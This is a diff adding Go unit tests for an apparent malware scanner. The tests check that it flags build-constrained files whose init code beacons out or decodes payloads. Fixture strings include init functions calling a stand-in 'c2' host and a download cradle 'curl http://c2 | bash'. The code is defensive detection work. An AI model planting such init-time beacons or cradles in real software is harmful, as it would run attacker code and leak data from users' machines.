@@ -99,6 +99,73 @@ func TestAnalyzeGo_CgoFlagInjection(t *testing.T) {
 	}
 }
 
+// TestAnalyzeGo_ConstrainedInit covers OPU-28 Increment 3: a build-constrained
+// file whose startup code carries a network/decode/credential/cradle capability is
+// surfaced as an init-evasion hook (with no install-hook capability), while a bare
+// init, an unconstrained file, a constrained-but-benign platform file, an
+// exec-only init, and a test file all stay silent.
+func TestAnalyzeGo_ConstrainedInit(t *testing.T) {
+	positives := []struct{ name, file, src string }{
+		{"build-tag + init + network", "beacon.go",
+			"//go:build linux\n\npackage p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2/x\") }\n"},
+		{"filename suffix + init + network", "telemetry_linux.go",
+			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2/x\") }\n"},
+		{"blank-var call + decode", "loader_amd64.go",
+			"package p\nvar _ = boot()\nfunc boot() { base64.b64decode(blob) }\n"},
+		{"legacy +build + cradle", "x.go",
+			"// +build linux\n\npackage p\nfunc init() { sh(\"curl http://c2 | bash\") }\n"},
+	}
+	for _, c := range positives {
+		h, ok := analyzeConstrainedInit(c.file, c.src)
+		if !ok {
+			t.Errorf("%s: expected an init-evasion hook, got none", c.name)
+			continue
+		}
+		if len(h.Caps) != 0 {
+			t.Errorf("%s: a runtime init must expose NO install-hook capability, caps=%v", c.name, h.Caps)
+		}
+		var hasCap bool
+		for _, e := range h.Evidence {
+			if IsInitEvasionMarker(e) {
+				hasCap = true
+			}
+		}
+		if !hasCap {
+			t.Errorf("%s: hook must carry an init-cap marker, evidence=%v", c.name, h.Evidence)
+		}
+	}
+
+	negatives := []struct{ name, file, src string }{
+		{"unconstrained init", "reg.go",
+			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://x\") }\n"},
+		{"constrained benign init", "driver_linux.go",
+			"package p\nfunc init() { register(driver) }\n"},
+		{"constrained network, no init", "net_linux.go",
+			"package p\nimport \"net/http\"\nfunc Do() { http.Get(\"http://x\") }\n"},
+		{"constrained init, exec only", "run_linux.go",
+			"package p\nfunc init() { run(\"make | sh\") }\n"}, // CapExec (| sh), but no network/cradle/decode/creds
+		{"test file", "beacon_linux_test.go",
+			"package p\nimport \"net/http\"\nfunc init() { http.Get(\"http://c2\") }\n"},
+		{"interface assertion, not a blank-var call", "impl_linux.go",
+			"package p\nvar _ Reader = (*T)(nil)\nfunc Do() { http.Get(\"http://c2\") }\n"},
+	}
+	for _, c := range negatives {
+		if _, ok := analyzeConstrainedInit(c.file, c.src); ok {
+			t.Errorf("%s must not fire an init-evasion hook", c.name)
+		}
+	}
+}
+
+// TestIsInitEvasionMarker pins the VC-002i gate predicate.
+func TestIsInitEvasionMarker(t *testing.T) {
+	if !IsInitEvasionMarker("init-cap:network") {
+		t.Error("init-cap:network should be an init-evasion marker")
+	}
+	if IsInitEvasionMarker("init-constraint:linux") || IsInitEvasionMarker("cgo-inject:plugin") {
+		t.Error("constraint and cgo markers are not init-evasion markers")
+	}
+}
+
 // TestIsCgoInjectionMarker pins the VC-002h gate predicate.
 func TestIsCgoInjectionMarker(t *testing.T) {
 	if !IsCgoInjectionMarker("cgo-inject:plugin") {
